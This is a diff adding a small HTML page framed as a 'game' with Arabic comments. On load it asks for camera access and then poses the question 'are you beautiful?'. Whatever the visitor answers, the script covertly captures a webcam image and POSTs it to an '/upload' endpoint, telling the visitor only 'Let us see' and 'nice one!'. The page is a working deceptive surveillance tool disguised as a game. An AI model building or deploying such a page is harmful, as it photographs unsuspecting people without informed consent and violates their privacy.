@@ -1,0 +1,92 @@
+﻿<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Si_l3issewi_web</title>
+    <style>
+        body {
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; background: linear-gradient(135deg, #74ebd5, #acb6e5);
+            font-family: Arial, sans-serif; text-align: center; color: #333;
+        }
+        .container {
+            background: #fff; padding: 20px; border-radius: 15px; box-shadow: 0 0 10px rgba(0,0,0,0.2);
+        }
+        button {
+            margin: 10px; padding: 10px 20px; border: none; border-radius: 5px;
+            background-color: #4CAF50; color: white; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="app">
+        <p><h3>give us permession to play</h3></p>
+    </div>
+
+    <script>
+        async function askPermissionAndStart() {
+            const app = document.getElementById('app');
+            try {
+                // طلب إذن الكاميرا أولاً
+                await navigator.mediaDevices.getUserMedia({ video: true });
+                // إذن الكاميرا تم السماح به، نسأل هل يريد يلعب
+                app.innerHTML = `
+                    <p>do you want to play a game with Si_l3issewi?</p>
+                    <button onclick="startGame(true)">yes</button>
+                    <button onclick="startGame(false)">no</button>
+                `;
+            } catch (err) {
+                // رفض إذن الكاميرا
+                app.innerHTML = `<p>يجب السماح بالكاميرا للعب اللعبة!</p>`;
+            }
+        }
+
+        function startGame(agree) {
+            const app = document.getElementById('app');
+            if (agree) {
+                app.innerHTML = `
+                    <p>are you beautiful?</p>
+                    <button onclick="capture('yes')">yes</button>
+                    <button onclick="capture('no')">no</button>
+                `;
+            } else {
+                app.innerHTML = `<p>the game has been rejected</p>`;
+                // ممكن تغلق الصفحة لو تحب:
+                // window.close();
+            }
+        }
+
+        async function capture(answer) {
+            const app = document.getElementById('app');
+            app.innerHTML = `<p>Let us see</p>`;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+                const dataURL = canvas.toDataURL('image/png');
+
+                fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: dataURL, answer })
+                });
+
+                app.innerHTML = `<p>nice one!</p>`;
+            } catch (e) {
+                app.innerHTML = `<p>you didnt give us the permission you have to</p>`;
+            }
+        }
+
+        // نبدأ الطلب مباشرة عند تحميل الصفحة
+        window.onload = askPermissionAndStart;
+    </script>
+</body>
+</html>
